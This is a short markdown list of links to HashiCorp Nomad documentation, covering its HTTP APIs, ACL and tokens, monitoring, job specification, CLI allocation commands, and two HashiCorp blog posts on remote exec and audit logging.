- [Nomad HTTP API](https://developer.hashicorp.com/nomad/api-docs)
- [Status HTTP API](https://developer.hashicorp.com/nomad/api-docs/status)
- [Jobs HTTP API](https://developer.hashicorp.com/nomad/api-docs/jobs)
- [Allocations HTTP API](https://developer.hashicorp.com/nomad/api-docs/allocations)
- [Client HTTP API](https://developer.hashicorp.com/nomad/api-docs/client)
- [ACL HTTP API](https://developer.hashicorp.com/nomad/api-docs/acl)
- [ACL Tokens HTTP API](https://developer.hashicorp.com/nomad/api-docs/acl/tokens)
- [ACL Auth Methods HTTP API](https://developer.hashicorp.com/nomad/api-docs/acl/auth-methods)
- [Variables HTTP API](https://developer.hashicorp.com/nomad/api-docs/variables)
- [Events HTTP API](https://developer.hashicorp.com/nomad/api-docs/events)
- [Metrics Reference](https://developer.hashicorp.com/nomad/docs/reference/metrics)
- [Monitoring Nomad](https://developer.hashicorp.com/nomad/docs/operations/monitoring-nomad)
- [Filesystem](https://developer.hashicorp.com/nomad/docs/concepts/filesystem)
- [JSON Job Specification](https://developer.hashicorp.com/nomad/api-docs/json-jobs)
- [Hashicorp Configuration Language (HCL) reference](https://developer.hashicorp.com/nomad/docs/reference/hcl2)
- [nomad alloc fs command reference](https://developer.hashicorp.com/nomad/commands/alloc/fs)
- [nomad alloc logs command reference](https://developer.hashicorp.com/nomad/commands/alloc/logs)
- [nomad alloc exec command reference](https://github.com/hashicorp/web-unified-docs/blob/main/content/nomad/v2.0.x/content/commands/alloc/exec.mdx)
- [HashiCorp Nomad Remote Exec Web UI](https://www.hashicorp.com/en/blog/hashicorp-nomad-remote-exec-web-ui)
- [HashiCorp Nomad Enterprise Audit Logging](https://www.hashicorp.com/en/blog/hashicorp-nomad-enterprise-audit-logging)
